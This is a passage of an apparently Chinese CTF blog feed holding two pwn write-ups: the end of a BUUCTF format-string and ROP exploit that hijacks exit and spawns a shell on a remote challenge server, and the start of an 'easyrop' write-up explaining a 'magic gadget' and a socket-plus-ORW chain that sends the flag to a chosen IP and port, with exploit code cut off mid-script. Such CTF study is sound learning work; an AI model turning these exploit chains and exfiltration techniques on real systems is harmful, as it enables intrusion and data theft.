<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#弹出了r13 r14 r15寄存器</span></span><br><span class="line">rop+=p64(csu_gadget1)</span><br><span class="line">rop+=p64(<span class="number">0</span>)<span class="comment">#rbx</span></span><br><span class="line">rop+=p64(<span class="number">1</span>)<span class="comment">#rbp</span></span><br><span class="line">rop+=p64(term_hook)</span><br></pre></td></tr></table></figure>

<p>然后开始控制rdx，结合magic gadget来看的话</p>
<p>adc    DWORD PTR [rbp+0x48],edx</p>
<p>rdx里面装的是one_gadget和stderr的偏移（edx就是rdx寄存器的低四字节），由于这个偏移为负的，因此需要加上一个0x10000000000000000 (取补码)</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018044.png" alt="image-20220419212514038"></p>
<p>接下来就是csu的正常传参，等执行完上面这个片段的时候，会再次执行下面的loc_400826，到pop rbp这里将其修改为stderr的地址-0x48即可（因为magic gadget中给stderr加了0x48），然后ret劫持到magic gadget上，最后再执行一次csu片段，控制r12为stderr地址，回到call ptr的时候，即可去执行one_gadget。</p>
<p>完整rop链：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rop=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#弹出了r13 r14 r15寄存器</span></span><br><span class="line"><span class="comment">#执行adc</span></span><br><span class="line">rop+=p64(csu_gadget1)</span><br><span class="line">rop+=p64(<span class="number">0</span>)<span class="comment">#rbx</span></span><br><span class="line">rop+=p64(<span class="number">1</span>)<span class="comment">#rbp</span></span><br><span class="line">rop+=p64(term_hook)</span><br><span class="line">rop+=p64(offset+<span class="number">0x100000000</span>)</span><br><span class="line">rop+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(csu_gadget2)</span><br><span class="line">rop+=p64(<span class="number">0</span>)<span class="comment">#add rsp 8</span></span><br><span class="line">rop+=p64(<span class="number">0</span>)<span class="comment">#rbx</span></span><br><span class="line">rop+=p64(stderr_got_addr-<span class="number">0x48</span>)<span class="comment">#rbp</span></span><br><span class="line">rop+=<span class="number">32</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">rop+=p64(adc_addr)</span><br><span class="line"><span class="comment">#call stderr</span></span><br><span class="line">rop+=<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span><span class="comment">#rbp</span></span><br><span class="line">rop+=p64(csu_gadget1)</span><br><span class="line">rop+=p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(<span class="number">1</span>)</span><br><span class="line">rop+=p64(stderr_got_addr)</span><br><span class="line">rop+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(csu_gadget2)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="EXP："><a href="#EXP：" class="headerlink" title="EXP："></a>EXP：</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./a&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node4.buuoj.cn&#x27;</span>,<span class="number">28387</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;\x78&#x27;</span>)</span><br><span class="line">leak_stack_addr=<span class="built_in">int</span>(p.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;leak_stack--&gt;  &#x27;</span>,<span class="built_in">hex</span>(leak_stack_addr))</span><br><span class="line">hook_addr=((leak_stack_addr-<span class="number">0x118</span>)&amp;<span class="number">0xff</span>)<span class="comment">#减八因为bss段指针的指针需要抬高一个内存单元，去挨着printf返回地址</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(hook_addr))</span><br><span class="line"><span class="keyword">if</span> hook_addr&gt;<span class="number">0xa3</span>:</span><br><span class="line">    judge=<span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    judge=<span class="number">2</span></span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">stderr_got_addr=<span class="number">0x601040</span></span><br><span class="line">read_print_addr=<span class="number">0x4007A3</span></span><br><span class="line">pop_rsp_r13_r14_r15_ret=<span class="number">0x40082d</span></span><br><span class="line">adc_addr=<span class="number">0x4006e8</span></span><br><span class="line">csu_gadget1=<span class="number">0x40082A</span></span><br><span class="line">csu_gadget2=<span class="number">0x400810</span></span><br><span class="line">stderr_offset=<span class="number">0x3C5540</span></span><br><span class="line">one_gadget_offset=<span class="number">0x4526a</span></span><br><span class="line">offset=one_gadget_offset-stderr_offset</span><br><span class="line">term_hook=<span class="number">0x600e10</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#rop链</span></span><br><span class="line">rop=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)<span class="comment">#弹出了r13 r14 r15寄存器</span></span><br><span class="line"><span class="comment">#执行adc</span></span><br><span class="line">rop+=p64(csu_gadget1)</span><br><span class="line">rop+=p64(<span class="number">0</span>)<span class="comment">#rbx</span></span><br><span class="line">rop+=p64(<span class="number">1</span>)<span class="comment">#rbp</span></span><br><span class="line">rop+=p64(term_hook)</span><br><span class="line">rop+=p64(offset+<span class="number">0x100000000</span>)</span><br><span class="line">rop+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(csu_gadget2)</span><br><span class="line">rop+=p64(<span class="number">0</span>)<span class="comment">#add rsp 8</span></span><br><span class="line">rop+=p64(<span class="number">0</span>)<span class="comment">#rbx</span></span><br><span class="line">rop+=p64(stderr_got_addr-<span class="number">0x48</span>)<span class="comment">#rbp</span></span><br><span class="line">rop+=<span class="number">32</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">rop+=p64(adc_addr)</span><br><span class="line"><span class="comment">#call stderr</span></span><br><span class="line">rop+=<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span><span class="comment">#rbp</span></span><br><span class="line">rop+=p64(csu_gadget1)</span><br><span class="line">rop+=p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(<span class="number">1</span>)</span><br><span class="line">rop+=p64(stderr_got_addr)</span><br><span class="line">rop+=p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">rop+=p64(csu_gadget2)</span><br><span class="line"></span><br><span class="line"><span class="comment">#劫持exit，控制执行流</span></span><br><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x298</span>)+<span class="string">&#x27;c%26$hn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">16</span>,<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(read_print_addr)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#sleep(0.5)</span></span><br><span class="line">pause()</span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">1</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr-<span class="number">0xa3</span>)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">2</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-hook_addr)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#修改printf返回地址，修改指针指向的内容（也就是bss段地址）</span></span><br><span class="line"><span class="comment">#此时第一次是不用修改指向bss段指针的，不过之后的每次修改bss段地址，都需要提前移动一下指向bss段的指针</span></span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#sleep(0.5)</span></span><br><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x1088</span>-<span class="number">0xa3</span>)+<span class="string">&#x27;c%13$hn&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line"><span class="comment">#开始移动 指向bss段指针，方便第二次的写入bss段</span></span><br><span class="line">hook_addr=hook_addr+<span class="number">0x2</span></span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#sleep(0.5)</span></span><br><span class="line"><span class="comment">#if是用来判断，0xa3和输入的指针末尾谁大，以来决定谁放在前面</span></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">1</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr-<span class="number">0xa3</span>)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">2</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-hook_addr)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#sleep(0.5)</span></span><br><span class="line">payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x60</span>)+<span class="string">&#x27;c%13$hn&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-<span class="number">0x60</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#sleep(0.5)</span></span><br><span class="line">hook_addr=hook_addr+<span class="number">0x2</span></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">1</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr-<span class="number">0xa3</span>)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> judge==<span class="number">2</span>:</span><br><span class="line">    payload=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(hook_addr)+<span class="string">&#x27;c%18$hhn&#x27;</span></span><br><span class="line">    payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xa3</span>-hook_addr)+<span class="string">&#x27;c%23$hhn&#x27;</span></span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#sleep(0.5)</span></span><br><span class="line">payload=<span class="string">&#x27;%13$hn&#x27;</span></span><br><span class="line">payload+=<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0x082d</span>)+<span class="string">&#x27;c%23$hn&#x27;</span></span><br><span class="line">payload=payload.ljust(<span class="number">40</span>,<span class="string">&#x27;a&#x27;</span>)<span class="comment">#因为前面填充了40字节的数据，而输入的起始地址为0x601060，加上40，就是rop链的位置（最终确定rop链为0x601088）</span></span><br><span class="line">payload+=rop</span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="comment">#sleep(0.5)</span></span><br><span class="line">pause()</span><br><span class="line"><span class="comment">#重新获取一下shell</span></span><br><span class="line">p.sendline(<span class="string">&quot;sh&gt;&amp;2&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202307012018045.png"></p>
<h3 id="本地通了，远程没通，应该去考虑libc的问题"><a href="#本地通了，远程没通，应该去考虑libc的问题" class="headerlink" title="本地通了，远程没通，应该去考虑libc的问题"></a>本地通了，远程没通，应该去考虑libc的问题</h3><p>最后本地打通，远程没打通。此时应该意识到可能是libc的问题，而这道题one_gadget又会受到libc的影响。因此应该去考虑下本地patch的libc是否和远程的一样，检查了一下发现，最后的问题出在了libc的小版本不同。最后用buu上的libc去搜索了一下one_gadget，最终成功获取shell。本地当时能成功是因为我patch的一个2.23 libc，又去这个libc里搜了个one_gadget，所以自然是能打通的，但是服务器那边肯定是以它自己的libc为准…</p>
]]></content>
      <categories>
        <category>buu刷题</category>
      </categories>
      <tags>
        <tag>one_gadget</tag>
        <tag>格式化字符串漏洞</tag>
        <tag>magic_gadget</tag>
        <tag>劫持exit_hook</tag>
      </tags>
  </entry>
  <entry>
    <title>easyrop_2022胖哈勃春季赛</title>
    <url>/posts/d0e6a746.html</url>
    <content><![CDATA[<p>通过这道题的学习与总结：</p>
<p>1、rep指令是进行循环，movs qword ptr [rdi],qword ptr[rsi]则可以拷贝，二者结合就是可以大规模拷贝数据到另一个内存空间。而想实现它，仅仅只需要控制rdi和rsi以及rcx寄存器即可。</p>
<p>2、我们往可读可写可执行的内存中写入的任何机器码都是可以被当做指令来执行的，而想执行这些指令，仅仅用ret或者call跳转到这些指令所在地址即可<strong>（ret和call要的是指令所在地址，并非指令）</strong></p>
<p>3、关闭标准输出，没有回显时，可以利用magic_gadget来去获取一些我们需要的函数。</p>
<p>4、开启沙箱并且三个文件描述符全关时（意味着orw读取的flag也无法看见），可以用socket+connect将flag发送到这个新开的文件上（毕竟close关闭的仅仅是当前终端的0,1,2)</p>
<span id="more"></span>

<h2 id="保护策略："><a href="#保护策略：" class="headerlink" title="保护策略："></a>保护策略：</h2><p><img src="/../img/2706180-20220426101917635-1568812321.png"></p>
<p><img src="/../img/2706180-20220426101928743-1588465175.png"></p>
<h3 id="canary开了，就没法直接溢出？"><a href="#canary开了，就没法直接溢出？" class="headerlink" title="canary开了，就没法直接溢出？"></a>canary开了，就没法直接溢出？</h3><p>此时来到的要讲的第一点，checksec是检测出了canary的，但是用gdb调试之后发现，并没有看见canary（如下图），而返回地址是直接被垃圾数据覆盖了。</p>
<p><img src="/../img/2706180-20220426101943521-1024948707.png"></p>
<p>这是因为出题人编译程序的时候只使用了 fstack-protector  选项，而非使用的 fstack-protector-all  。</p>
<p>简单来说， <strong>fstack-protector-all  选项会对每一个函数都插入一个canary的值，但缺点是会增加很多额外的栈空间</strong>，增加程序体积。<strong>而开启了fstack-protector  选项则是在具有局部数组变量的函数（数组大小超过八字节）才会插入canary，缺点是保护能力有限</strong>。</p>
<p>了解了上述内容后，开启fstack-protector  选项就会出现这种情况，如果是定义的int类型的变量，而后面又使用了输入函数从这个变量开始写入字节且**<font color=red>输入函数写入的字节大于了变量类型的字节数</font>，就会出现检查的时候明明有canary保护，但是依旧可以正常溢出的这种情况**（如下图）。</p>
<p><img src="/../img/2706180-20220426101952307-600170163.png"></p>
<h2 id="程序分析："><a href="#程序分析：" class="headerlink" title="程序分析："></a>程序分析：</h2><p>程序整体流程非常简单，存在0x1b0的溢出。然后close函数关闭了标准输入、标准输出、标准错误，<strong>就是程序没回显且无法多次输入</strong>。另外开了沙箱保护，无法执行execve来获取shell。那orw?可是标准输出也被关了（之前也做过关闭文件描述符的，不过那几道都没有把文件描述符全部关闭，因此获取shell的时候重定向一下文件描述符就ok了，不过这道题三个描述符全关，没办法重定向文件描述符）</p>
<p>因此这道题采用的对抗策略是一种特殊的orw，使用socket+connect+orw。即创建一个套接字然后connect与一个ip和端口所绑定，再orw，读取flag，将flag打印到新开的socket上，下面仔细讲一下这些都是个什么东西。</p>
<h2 id="大致思路："><a href="#大致思路：" class="headerlink" title="大致思路："></a>大致思路：</h2><h3 id="socket函数和connect函数咋理解？"><a href="#socket函数和connect函数咋理解？" class="headerlink" title="socket函数和connect函数咋理解？"></a>socket函数和connect函数咋理解？</h3><p>具体解释的话可以看一下官方文档，我谈一下自己的理解。(这两个函数布置参数时，需要注意的地方，我做了相关解释，都放在了文末)</p>
<p><strong>socket函数就是去创建一个套接字</strong>（这个套接字很抽象，不过linux中万物皆文件，我就先试着把它理解为一个文件），如果单独使用的话，它仅仅会创建和声明一下这个’文件’的特征，然后返回一个文件描述符（指向了创建的这个文件）。但此时它还是个空壳子，并没有灵魂。</p>
<p><strong>而connect函数的作用就是赋予刚刚那个空壳子灵魂</strong>，也就是<strong>将网络的地址与这个文件联系起来</strong>。使用connect函数之后，网络的一个地址及端口就算与socket绑定了,此时发送到socket上的数据就发到了与其绑定的ip的端口上。</p>
<p>也就是说现在的大致思路出来了，但是有很多地方的细节问题还要解决，因为程序里没有socket函数和connect函数，但现在还需要使用，那我们只能去系统调用。</p>
<p><img src="/../img/2706180-20220426102004222-1183097211.png"></p>
<p>没有syscall…   不过我们可以利用magic gadget造一个出来</p>
<p>magic gadget</p>
<h3 id="什么是magic-gadget？"><a href="#什么是magic-gadget？" class="headerlink" title="什么是magic gadget？"></a>什么是magic gadget？</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add    DWORD PTR [rbp-0x3d], ebx</span><br><span class="line">nop    DWORD PTR [eax+eax*1+0x0]</span><br><span class="line">repz ret</span><br></pre></td></tr></table></figure>

<p>magic gadget似乎是一种统称？就是上面这种神奇的小玩意，师傅们都叫它magic gadget，似乎并不单指某个gadgets，因为前一段做<a href="https://www.cnblogs.com/ZIKH26/articles/16167705.html">de1ctf_2019_unprintable</a>的时候，碰见了另一个magic_gadgets。</p>
<h4 id="magic-gadget它有什么用？"><a href="#magic-gadget它有什么用？" class="headerlink" title="magic gadget它有什么用？"></a>magic gadget它有什么用？</h4><p>这个gadget的核心就在于下面的指令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add    DWORD PTR [rbp-0x3d], ebx</span><br></pre></td></tr></table></figure>

<p>可以看出来它可以去修改ebp-0x3d所指向的内容，<strong>只要我们能够控制rbp和ebx，那就可以去修改任意地址的任意值了</strong>（我们可以借此来实现修改got表，或者是往bss段写任意数据）</p>
<h4 id="magic-gadget应该怎么去利用？"><a href="#magic-gadget应该怎么去利用？" class="headerlink" title="magic gadget应该怎么去利用？"></a>magic gadget应该怎么去利用？</h4><p>首先我们要想办法控制rbp和ebx的值，这一点我们可以通过程序中的csu片段来做到。</p>
<h5 id="先说修改got表"><a href="#先说修改got表" class="headerlink" title="先说修改got表"></a>先说修改got表</h5><p>既然add增加的是rbp-0x3d所指向的数据，而ebx又是增加的值，我就以这道题获取syscall的方法为例说明一下。</p>
<p>由于在alarm函数里syscall距离alarm函数的真实地址偏移仅仅为5，那岂不是说我<strong>ebx存一个5，然后让rbp-0x3d为alarm的got地址，执行magic gadget就可以修改alarm的got表为syscall的真实地址</strong>。如此我们再执行alarm函数的时候，就相当于执行的是syscall。</p>
<blockquote>
<p>此时这里就有一个坑，想执行syscall的时候，我应该用alarm的got地址还是plt地址？ 答案放在了文末</p>
</blockquote>
<h5 id="再说往bss段中任意写入数据"><a href="#再说往bss段中任意写入数据" class="headerlink" title="再说往bss段中任意写入数据"></a>再说往bss段中任意写入数据</h5><p>其实说写入数据就应该想到一个疑问，add指令是进行加法，咋就能直接去写入<strong>任意</strong>数据了，如果rbp-0x3d指向的位置原本就有数据，还能任意写？</p>
<p>答案是不能的，这只是一个magic gadget，又不是一个无敌gadget，指令确实只能相加，可注意审题，我说的是<strong>往bss段任意写入数据</strong>。bss段有什么特点？<strong>它属于静态内存分配，程序一开始就会对这个段进行清零</strong>。既然<strong>bss段里面都是0，那就相当于我不管add什么，都是相当于我往里面写了什么</strong>。因此用magic gadget在对bss段进行操作的时候，是可以达到任意地址任意写的（不过值得一提的是，<strong>由于偏移是放在ebp中的，因此在64位程序里面，用magic gadget写的时候，一次只能写入四个字节</strong>）</p>
<h4 id="寻找magic-gadget"><a href="#寻找magic-gadget" class="headerlink" title="寻找magic gadget"></a>寻找magic gadget</h4><p>这个神奇的小东西存在于__do_global_dtors_au这个函数中，它是gcc编译器自身的一个函数，作用是析构函数。但是<strong>在ida查看会发现这段gadget并不存在，但是可以通过将机器码错位得到我们想要的gadget</strong>。</p>
<p><img src="/../img/2706180-20220426102017372-286472307.png"></p>
<p>现在看一下ida正常的两个指令，以及他们对应的十六进制机器码</p>
<p><img src="/../img/2706180-20220426102025440-653483116.png"><br><img src="/../img/2706180-20220426102033744-1476514134.png"></p>
<p><img src="/../img/2706180-20220426102057610-1265266427.png"></p>
<p><img src="/../img/2706180-20220426102206921-1073508038.png"></p>
<p>发现将机器码再转成汇编，确实是原来的指令。不过我们现在去拿01 5d c3这段机器码（也就是上面两个指令之间的一部分）去得到我们想要的magic gadget（如下图）<br><img src="/../img/2706180-20220426102217546-987677091.png"></p>
<p><strong>理论上这个gadget在每个64位程序都存在（不过需要机器码错位得到）</strong>。</p>
<p>需要的时候，直接用Ropgadget搜这个机器码就可以了。（参数是opcode)<br><img src="/../img/2706180-20220426102225206-1415630040.png"></p>
<h4 id="怎么理解这个错位得到的机器码？"><a href="#怎么理解这个错位得到的机器码？" class="headerlink" title="怎么理解这个错位得到的机器码？"></a>怎么理解这个错位得到的机器码？</h4><p><img src="/../img/2706180-20220426102239185-1717796383.png"></p>
<p>观察上图，很容易就会有一个问题，CPU如何知道这个机器指令的长度？</p>
<p>其实啊，每个指令由操作码和操作数两部分组成，CPU设计好的时候，指令集就已经确定了，CPU对每条指令都规定了对应的机器码，<strong>CPU刚开始读取指令的时候，并不知道这个指令的长度，不过它会先读取操作码，读完操作码之后，它就知道这个指令应该是多长了，从而再去读对应字节的操作数</strong>。</p>
<p>这样再理解错位机器码的时候就很容易了，CPU面对的只有二进制01（上面写成十六进制是方便理解），只要你能确保你想要的指令是存在于代码段的，尽管他们在ida里是看不到的。却依然可以去拿这个指令去执行，<strong>因为CPU并不会去检查你这个指令是否是程序中正常的指令，即使你是错位得到的</strong>。</p>
<h3 id="一个字节太多的payload"><a href="#一个字节太多的payload" class="headerlink" title="一个字节太多的payload"></a>一个字节太多的payload</h3><p>现在也有了syscall，那按理说可以去进行系统调用socket和connect了吧？<br><img src="/../img/2706180-20220426102259813-2020062452.png"></p>
<p>也没有rax…，程序里也没有任何与rax有关的指令。</p>
<p>但是libc里啥都有，因此我们的对策是在libc里找到pop rax ; ret指令，然后将其覆写到无用函数的got表里。</p>
<p>继续采用magic gadget。大致思路就是去拿到libc中无用函数的偏移再拿到libc中pop rax;ret的偏移，然后计算二者偏移放入ebx，然后rbp-0x3d写入无用函数的got地址，执行magic gadget即可。去libc中找函数偏移的时候踩了个坑，在文末记录了一下。</p>
<p>接着思路就很简单了，用magic gadget凭空造出来我们需要的东西，然后去用ret2syscall的手法来执行socket+connect+open+read+write函数即可。真的这么简单么？ 我们似乎忘记了，这道题是有溢出限制的。0x1b0个字节的溢出，看起来很多，但是真正实现起来刚才的思路会发现溢出远远不够。</p>
<p>下面是上面思路所对应的exp（不想仔细研究的可以不研究，毕竟这个不是本题正确的exp，只是放一下上面思路的exp（这个如果溢出足够的话，这个exp是可以打通的））</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=process(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./a&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">alarm_plt_addr=e.plt[<span class="string">&#x27;alarm&#x27;</span>]</span><br><span class="line">alarm_got_addr=e.got[<span class="string">&#x27;alarm&#x27;</span>]</span><br><span class="line">close_got_addr=e.got[<span class="string">&#x27;close&#x27;</span>]</span><br><span class="line">close_plt_addr=e.plt[<span class="string">&#x27;close&#x27;</span>]</span><br><span class="line">prctl_got_addr=e.got[<span class="string">&#x27;prctl&#x27;</span>]</span><br><span class="line">prctl_plt_addr=e.plt[<span class="string">&#x27;prctl&#x27;</span>]</span><br><span class="line">read_got_addr=e.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">main_addr=<span class="number">0x40086A</span></span><br><span class="line">pop_rdi_addr=<span class="number">0x400903</span></span><br><span class="line">pop_rsi_r15_addr=<span class="number">0x400901</span></span><br><span class="line">bss_addr=<span class="number">0x601100</span></span><br><span class="line">magic_gadget_addr=<span class="number">0x400618</span></span><br><span class="line">gadget=<span class="number">0x4008fa</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#此时在将flag写入bss段</span></span><br><span class="line">payload=<span class="number">16</span>*<span class="string">&#x27;a&#x27;</span></span><br><span class="line">payload+=p64(gadget)</span><br><span class="line">payload+=<span class="string">&#x27;flag\x00\x00\x00\x00&#x27;</span><span class="comment">#这里即使最后ebx只能传送前四字节，但依然要用\x00来补齐</span></span><br><span class="line"><span class="comment"># 不然会导致后面地址与flag会在同一个内存单元</span></span><br><span class="line">payload+=p64(bss_addr+<span class="number">0x3d</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#此时在将sockaddr结构写入bss段</span></span><br><span class="line"><span class="comment"># 127.0.0.1 1000 其中0100007f为127.0.0.1 e803 为03e8即1000，0002为AF_INET</span></span><br><span class="line"><span class="comment">#下面两部分，是在凑齐p64(0x0100007fe8030002),因为ebp一次只能传四字节，因此要传两次</span></span><br><span class="line"><span class="comment">#这个回环地址可以改成⾃⼰的服务器的ip端⼝（以此在比赛当做拿到远程的flag）</span></span><br><span class="line">payload+=p64(gadget)</span><br><span class="line">payload+=p64(<span class="number">0xe8030002</span>)<span class="comment">#同上，即使最后ebx只传送四字节，但依然要用p64来放到栈里，用来保持一个完整的内存单元</span></span><br><span class="line">payload+=p64(bss_addr+<span class="number">8</span>+<span class="number">0x3d</span>)<span class="comment">#这里加8是要跳过flag所处的整个内存单元</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br><span class="line"></span><br><span class="line">payload+=p64(gadget)</span><br><span class="line">payload+=p64(<span class="number">0x0100007f</span>)</span><br><span class="line">payload+=p64(bss_addr+<span class="number">12</span>+<span class="number">0x3d</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#修改alarm的got表为syscall地址</span></span><br><span class="line">payload+=p64(gadget)</span><br><span class="line">payload+=p64(<span class="number">0x5</span>)</span><br><span class="line">payload+=p64(alarm_got_addr+<span class="number">0x3d</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(magic_gadget_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#prctl libc偏移0x122210</span></span><br><span class="line"><span class="comment">#pop_rax_pop_rdx_pop_rbx的偏移为0x166241</span></span><br><span class="line"><span class="comment">#执行完下面的内容之后，prctl函数的got表装的是pop_rax_pop_rdx_pop_rbx ; ret</span></span><br><span class="line">payload+=p64(<span class="number">0x4008da</span>)</span><br><span class="line">payload+=p64(<span class="number">0x44031</span>)</span><br><span class="line">payload+=p64(prctl_got_addr+<span class="number">0x3d</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0</span>)</span><br><span class="line">payload+=p64(<span class="number">0x400618</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#接下来执行的内容是</span></span><br><span class="line"><span 